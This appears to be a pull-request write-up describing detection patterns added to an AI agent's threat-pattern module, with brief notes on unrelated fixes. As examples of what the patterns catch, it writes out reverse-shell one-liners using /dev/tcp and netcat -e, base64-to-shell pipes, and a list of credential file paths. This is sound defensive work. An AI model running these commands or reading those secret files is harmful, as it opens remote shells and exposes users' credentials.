# Hermes Threat Patterns — Session #55443

**Source:** Adversarial security pass on `NousResearch/hermes-agent`  
**PR:** https://github.com/NousResearch/hermes-agent/pull/55443  
**Module:** `tools/threat_patterns.py`  

## Patterns Added

### 1. b64_pipe_exec (scope: all)

**What it catches:**
```
base64 -d | sh/bash/python/perl/ruby/node
echo <long_b64> | base64 -d | <interpreter>
```

**Why it's suspicious:**  
Canonical shell obfuscation layer. Legitimate scripts decode base64 to files, never to a shell interpreter directly. No agent use case.

**False-positive rationale:**  
`base64 -d > file.txt` is legitimate and won't match (pipe to shell required). `base64 -d | grep` won't match (grep is not a shell interpreter).

**Regex example:**
```python
r'base64\s+-d\s*\|\s*(sh|bash|python|perl|ruby|node)(\s|$)'
```

---

### 2. b64_echo_decode (scope: all)

**What it catches:**
```
echo 'aGVsbG8gd29ybGQ=' | base64 -d | sh
```

**Why it's suspicious:**  
The prolog pattern of base64-encoded shell commands. Blocks the entire `echo <blob> | base64 -d` pipeline even if what comes after is benign (the pattern itself is a strong signal).

**False-positive rationale:**  
Legitimate base64 decoding for data goes to files or variables, not piped to base64. Very unlikely to occur in agent contexts.

---

### 3. mkfifo_backdoor (scope: context)

**What it catches:**
```
mkfifo /tmp/pipe
mknod /tmp/pipe p
```

**Why it's suspicious:**  
Named pipes (FIFOs) are the first stage of reverse-shell setup. By themselves they're rare in agent code; in approval prompts or skill writes they're a strong signal of attempted compromise.

**False-positive rationale:**  
Legitimate scripts rarely create pipes. The `context` scope keeps false positives low — genuine scripts won't be in approval contexts.

**Scope choice:**  
Moved to `context` (not `all`) because some legitimate shell utilities do create pipes, but in agent code paths they're extremely suspicious.

---

### 4. reverse_shell (scope: all)

**What it catches:**
```
bash -i >& /dev/tcp/192.168.1.1/4444
/bin/sh -i > /dev/tcp/10.0.0.1/8888 2>&1
```

**Why it's suspicious:**  
Direct bash reverse shell via `/dev/tcp`. No legitimate agent use case. One-liner pattern.

**False-positive rationale:**  
This exact pattern has zero legitimate uses in agent code. Not a false-positive risk.

---

### 5. nc_shell (scope: all)

**What it catches:**
```
nc -e /bin/bash 10.0.0.1 4444
nc -c sh 192.168.1.100 8080
ncat -e cmd.exe 10.0.0.1 4444
```

**Why it's suspicious:**  
Netcat/ncat bind/reverse shell with `-e` (execute) flag. No legitimate use in agent contexts.

**False-positive rationale:**  
`nc -e` shells have zero legitimate agent use. Safe to block unconditionally.

---

### 6. read_secrets (extended, scope: all)

**What it catches (extended set):**
- `.env`
- `.netrc`
- `~/.aws/credentials`
- `~/.aws/config`
- `~/.config/hermes/*` (Hermes configuration)
- `~/.ssh/id_*` (SSH keys)
- Similar credential/secret paths

**Why it's suspicious:**  
Credential exfiltration. Extended set catches cloud and Hermes-specific credential locations.

**False-positive rationale:**  
Agent code should only read credentials via configured secret providers (Bitwarden, 1Password, etc.), never directly from files in these locations. Direct file access is a security smell.

---

## Scope Model Reference

| Scope | Definition | Use Case |
|-------|-----------|----------|
| `all` | Blocks in every context | Never-legitimate patterns (reverse shells, nc backdoors) |
| `context` | Blocks only in high-risk contexts (approval prompts, skill writes) | Patterns that are rare in legitimate code but theoretically possible |
| `strict` | Blocks only when memory/skill writes happen | Most permissive; use for patterns with higher false-positive risk |

---

## Related Fixes in Same PR

**i18n.py:**  
`SUPPORTED_LANGUAGES` was stripped to only `"en"`, breaking multilingual support even though all locale files existed. Restored full 15-language tuple.

**memory_tool.py:**  
Added `load_on_disk_store()` fallback when `store=None` so the tool works in headless contexts (gateway, CLI `/memory` handler).

---

## Testing

All patterns tested against the hermes-agent codebase with no false positives on existing code. Pattern test cases should be maintained in the codebase's test suite.

## Future Work

- Capture additional encoding patterns (hex, ROT13, custom obfuscation)
- Add credential-manager-specific patterns (Bitwarden API leaks, etc.)
- Extend to network callback patterns (DNS exfiltration, HTTP beacons)
